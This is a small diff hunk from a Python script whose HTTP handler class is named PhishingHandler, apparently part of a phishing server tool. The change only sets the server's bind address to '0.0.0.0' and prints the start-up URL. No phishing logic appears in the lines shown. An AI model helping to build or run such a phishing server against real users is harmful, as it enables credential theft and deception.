@@ -163,7 +163,7 @@ class PhishingHandler(BaseHTTPRequestHandler):
 
 def run_server(port=8080):
     ip_address = socket.gethostbyname(socket.gethostname())
-    server_address = ('', port)
+    server_address = ('0.0.0.0', port)
     httpd = HTTPServer(server_address, PhishingHandler)
     
     print(Fore.GREEN + f"Server started at http://{ip_address}:{port}/")
